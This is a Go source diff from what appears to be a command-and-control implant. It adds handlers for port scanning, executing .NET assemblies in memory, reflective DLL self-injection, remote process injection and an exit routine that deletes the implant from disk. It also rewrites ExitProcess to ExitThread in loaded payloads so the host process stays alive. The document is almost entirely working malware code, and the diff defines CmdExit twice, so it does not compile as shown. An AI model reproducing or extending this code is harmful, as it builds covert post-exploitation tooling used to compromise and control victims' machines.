@@ -1,7 +1,8 @@
 package services
 
 import (
-	"fmt"
+	"bytes"
+	"errors"
 	"io"
 	"main/config"
 	"main/crypt"
@@ -194,9 +195,13 @@ func CmdHandlerJob(cmdBuf []byte) ([]byte, error) {
 }
 
 func CmdPortscanX64(cmdBuf []byte) ([]byte, error) {
-	cmdString := string(cmdBuf)
-	cmdString = strings.Replace(cmdString, "ExitProcess", "ExitThread"+"\x00", -1)
-	return packet.Spawn_X64([]byte(cmdString))
+	cmdBuf = bytes.Replace(cmdBuf, []byte("ExitProcess"), []byte("ExitThread"+"\x00"), -1)
+	return packet.Spawn_X64(cmdBuf)
+}
+
+func CmdPortscanX86(cmdBuf []byte) ([]byte, error) {
+	cmdBuf = bytes.Replace(cmdBuf, []byte("ExitProcess"), []byte("ExitThread"+"\x00"), -1)
+	return packet.Spawn_X86(cmdBuf)
 }
 
 func CmdKeylogger(cmdBuf []byte) ([]byte, error) {
@@ -204,13 +209,65 @@ func CmdKeylogger(cmdBuf []byte) ([]byte, error) {
 }
 
 func CmdExecuteAssemblyX64(cmdBuf []byte) ([]byte, error) {
-	length := packet.ReadInt(cmdBuf[29:33])
-	index := strings.Index(string(cmdBuf[length+33:]), string([]byte{byte(0), byte(0), byte(77), byte(90), byte(144), byte(0)}))
-	param := string(cmdBuf[length+33 : length+33+uint32(index)])
+	_, _, _, description, data, dll, err := ParseExecAsm(cmdBuf)
+	if err != nil {
+		return nil, errors.New("parameter wrong")
+	}
+	if string(description) != ".NET assembly" { // data is parameter, dll is reflectivedll
+		dll = bytes.ReplaceAll(dll, []byte("ExitProcess"), []byte("ExitThread\x00"))
+		return packet.DllInjectSelf(data, dll)
+	}
+	//data is Csharp, dll is environment
+	data = bytes.ReplaceAll(data, []byte("ExitProcess"), []byte("ExitThread\x00"))
+	dataBuf := bytes.NewBuffer(data)
+	data, _ = util.ParseAnArg(dataBuf)
+	dataParam := dataBuf.Bytes()
+	param := string(dataParam)
+
 	param = strings.ReplaceAll(param, "\x00", "")
 	param = strings.Trim(param, " ")
 	params := strings.Split(param, " ")
-	return packet.ExecuteAssembly(cmdBuf[33:length+33], params)
+	return packet.ExecuteAssembly(data, params)
+}
+
+func CmdExecuteAssemblyX86(cmdBuf []byte) ([]byte, error) {
+	_, _, _, description, data, dll, err := ParseExecAsm(cmdBuf)
+	if err != nil {
+		return nil, errors.New("parameter wrong")
+	}
+	if string(description) != ".NET assembly" { // data is parameter, dll is reflectivedll
+		dll = bytes.ReplaceAll(dll, []byte("ExitProcess"), []byte("ExitThread\x00"))
+		return packet.DllInjectSelf(data, dll)
+	}
+	//data is Csharp, dll is environment
+	data = bytes.ReplaceAll(data, []byte("ExitProcess"), []byte("ExitThread\x00"))
+	dataBuf := bytes.NewBuffer(data)
+	data, _ = util.ParseAnArg(dataBuf)
+	dataParam := dataBuf.Bytes()
+	param := string(dataParam)
+
+	param = strings.ReplaceAll(param, "\x00", "")
+	param = strings.Trim(param, " ")
+	params := strings.Split(param, " ")
+	return packet.ExecuteAssembly(data, params)
+}
+
+func ParseExecAsm(b []byte) (uint16, uint16, uint32, []byte, []byte, []byte, error) {
+	buf := bytes.NewBuffer(b)
+
+	callbackTypeByte := make([]byte, 2)
+	sleepTimeByte := make([]byte, 2)
+	offset := make([]byte, 4)
+	_, _ = buf.Read(callbackTypeByte)
+	_, _ = buf.Read(sleepTimeByte)
+	_, _ = buf.Read(offset)
+	callBackType := packet.ReadShort(callbackTypeByte)
+	sleepTime := packet.ReadShort(sleepTimeByte)
+	offSet := packet.ReadInt(offset)
+	description, err := util.ParseAnArg(buf)
+	csharp, err := util.ParseAnArg(buf)
+	dll := buf.Bytes()
+	return callBackType, sleepTime, offSet, description, csharp, dll, err
 }
 
 func CmdImportPowershell(cmdBuf []byte) ([]byte, error) {
@@ -222,7 +279,31 @@ func CmdPowershellPort(cmdBuf []byte, powershellImport []byte) ([]byte, error) {
 }
 
 func CmdInjectX64(cmdBuf []byte) ([]byte, error) {
-	return packet.InjectProcess(cmdBuf)
+	if strings.Contains(string(cmdBuf), "ReflectiveLoader") {
+		cmdBuf = bytes.ReplaceAll(cmdBuf, []byte("ExitProcess"), []byte("ExitThread\x00"))
+		return packet.DllInjectSelf([]byte("\x00"), cmdBuf[8:])
+	}
+	return packet.InjectProcessRemote(cmdBuf)
+}
+
+func CmdInjectX86(cmdBuf []byte) ([]byte, error) {
+	if strings.Contains(string(cmdBuf), "ReflectiveLoader") {
+		cmdBuf = bytes.ReplaceAll(cmdBuf, []byte("ExitProcess"), []byte("ExitThread\x00"))
+		return packet.DllInjectSelf([]byte("\x00"), cmdBuf[8:])
+	}
+	return packet.InjectProcessRemote(cmdBuf)
+}
+
+func CmdExit() ([]byte, error) {
+	if config.DeleteSelf {
+		_, err := packet.DeleteSelf()
+		if err != nil {
+			return nil, err
+		}
+		os.Exit(0)
+	}
+	os.Exit(0)
+	return []byte("success exit"), nil
 }
 
 func CmdExit() ([]byte, error) {
